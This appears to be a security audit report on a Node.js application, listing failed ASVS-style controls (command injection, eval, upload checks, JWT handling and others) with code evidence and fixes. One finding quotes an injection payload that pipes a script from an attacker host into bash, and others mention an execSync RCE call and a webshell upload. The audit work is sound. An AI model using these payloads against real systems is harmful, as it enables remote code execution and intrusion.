Non-Compliant Controls 11
V1.2.5
V1 · Encoding → V1.2 Injection Prevention
L1NON_COMPLIANT
Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding.
Reasoning
User-controlled filename query parameter is interpolated directly into a shell string passed to exec(). No sanitization or allowlisting is applied. An attacker can inject arbitrary OS commands (e.g. ; curl attacker.com/shell.sh | bash).
Evidence
src/routes/reports.js:84–90
const filename = req.query.filename;        // user-supplied, no validation
exec('convert ' + filename + ' output.pdf', (err, stdout) => {
  // fix: execFile('convert', [filename, 'output.pdf']) — args as array, not string
  res.send(stdout);
});
Remediation
Replace exec() with execFile('convert', [filename, 'output.pdf']). Validate filename against an allowlist of permitted characters (alphanumeric + dots) before use.
V1.3.2
V1 · Encoding → V1.3 Sanitization
L1NON_COMPLIANT
Verify that the application avoids the use of eval() or other dynamic code execution features. Where there is no alternative, any user input being included must be sanitized before being executed.
Reasoning
eval() is called with a user-supplied formula string from req.body.formula with no sanitization. Full server-side RCE is possible — an attacker can call require('child_process').execSync('id').
Evidence
src/utils/calculator.js:28–36
const formula = req.body.formula;           // user-supplied
return eval(formula);                       // RCE — no sandbox, no allowlist
Remediation
Replace eval() with a safe math expression parser such as mathjs or expr-eval. These only permit arithmetic operations and cannot access Node.js internals.

V5.2.2
V5 · File Handling → V5.2 File Upload and Content
L1NON_COMPLIANT
Verify that when the application accepts a file it checks if the file extension matches an expected file extension and validates that the contents correspond to the type represented by the extension.
Reasoning
Only the file extension is checked against an allowlist. No magic-bytes validation or content inspection is performed. An attacker can upload a PHP webshell renamed to shell.jpg that would bypass the extension check.
Evidence
src/middleware/upload.js:20–26
fileFilter: (req, file, cb) => {
  const ext = path.extname(file.originalname).slice(1).toLowerCase();
    if (!['jpg','png','pdf'].includes(ext)) return cb(new Error('Bad ext'));
    cb(null, true);  // accepted based on extension only — no content check
}
// package.json: no 'file-type', 'mmmagic', or 'sharp' dependency present
Remediation
Add the file-type npm package to read the first 4–12 bytes and verify the magic signature matches the declared extension before accepting the file.
V6.2.4
V6 · Authentication → V6.2 Password Security
L1NON_COMPLIANT
Verify that passwords submitted during account registration or password change are checked against an available set of, at least, the top 3000 passwords which match the application's password policy.
Reasoning
Only minimum length (12 chars) and a complexity regex are validated. No common-password blocklist check is present. A user can register with "Password123456" which satisfies both checks but is trivially guessable in a credential-stuffing attack.
Evidence
src/validators/authValidator.js:6–15
const passwordSchema = Joi.string()
  .min(12)
  .pattern(/^(?=.*[A-Z])(?=.*[0-9])/)
  .required();
// No blocklist import, no zxcvbn call, no HIBP lookup
// package.json — no 'zxcvbn', 'common-password-rules', or 'hibp' dependency
Remediation
Add zxcvbn and reject passwords with score < 3, or ship a local blocklist of the top 10k common passwords and reject matches at registration and password change.
V7.3.1
V7 · Sessions → V7.3 Session Timeout
L2NON_COMPLIANT
Verify that there is an inactivity timeout such that re-authentication is enforced according to risk analysis and documented security decisions.
Reasoning
JWT tokens have a 30-day absolute expiry with no inactivity tracking. A stolen token remains valid for the full window regardless of user activity. No sliding-window refresh, last-active table, or idle timeout exists. The 30-day duration is also not documented or risk-justified.
Evidence
src/services/authService.js:43–48
const token = jwt.sign(
  { userId: user.id, jti: uuidv4() },
  JWT_SECRET,
  { expiresIn: '30d' }   // no idle timeout; stolen token valid for 30 days
);
// No last_active column in schema, no token revocation table
Remediation
Issue short-lived access tokens (15 min) with a refresh token that tracks last_used. Expire refresh tokens after 30 minutes of inactivity. Alternatively, store last_active server-side and reject tokens exceeding the idle threshold.

V8.2.1
V8 · Authorization → V8.2 General Authorization Design
L1NON_COMPLIANT
Verify that the application ensures that function-level access is restricted to consumers with explicit permissions.
Reasoning
The DELETE /admin/users/:id endpoint is protected by authMiddleware (validates JWT) but is missing authorize(['admin']). Any authenticated user can delete any other account. All sibling admin routes correctly apply the role check.
Evidence
src/routes/admin.js:8–20

// ^^^ authorize(['admin']) missing — privilege escalation for any authenticated user
Remediation
Add the missing middleware: router.delete('/users/:id', authMiddleware, authorize(['admin']), deleteUser).
V9.1.2
V9 · Self-contained Tokens → V9.1 Token source and integrity
L1NON_COMPLIANT
Verify that only algorithms on an allowlist can be used to create and verify self-contained tokens… must not include the 'None' algorithm.
Reasoning
jwt.verify() is called without an algorithms option, accepting any algorithm declared in the token header including alg: "none". An attacker can forge a token with no signature and bypass authentication.
Evidence
src/middleware/auth.js:23
const decoded = jwt.verify(token, JWT_SECRET);
// no algorithms option → accepts alg:none and algorithm confusion attacks
// fix: jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })
Remediation
Pass { algorithms: ['HS256'] } as the third argument to jwt.verify(). This rejects any token that specifies a different or missing algorithm.
V11.2.2
V11 · Cryptography → V11.2 Secure Cryptography Implementation
L2NON_COMPLIANT
Verify that the application is designed with crypto agility such that algorithms, key lengths, rounds, ciphers and modes can be reconfigured, upgraded, or swapped at any time.
Reasoning
The cipher algorithm 'aes-256-gcm' is hardcoded as a string literal in both the encrypt and decrypt functions. Migrating to a stronger cipher (or post-quantum equivalent) requires touching multiple files with no central toggle.
Evidence
src/utils/crypto.js:15 and 44
crypto.createCipheriv('aes-256-gcm', key, iv)    // hardcoded
crypto.createDecipheriv('aes-256-gcm', key, iv)  // repeated
// No CRYPTO_ALGORITHM config value or abstraction
Remediation
Extract algorithm, key length, and IV size into a central config object (e.g. config/crypto.js). All cipher calls read from this single source, making algorithm rotation a one-line config change.

The webhook endpoint accepts the HMAC signature as a ?sig= query parameter. This causes the secret to appear in nginx access logs, application logs, browser history, and any Referer headers sent to third-party resources on the page.
Evidence
src/routes/webhooks.js:21–24
